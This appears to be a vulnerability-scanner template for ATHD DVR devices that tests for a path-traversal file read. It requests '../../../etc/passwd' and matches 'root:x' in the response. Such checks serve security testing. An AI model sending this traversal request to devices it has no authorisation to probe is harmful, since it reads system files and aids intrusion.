id: ATHD-DVR-fileRead
info:
  author: Str1am
  name: ATHD-DVR fileRead
  severity: medium
  tags: 53kf,file_read
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - root:x
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/../../../etc/passwd'
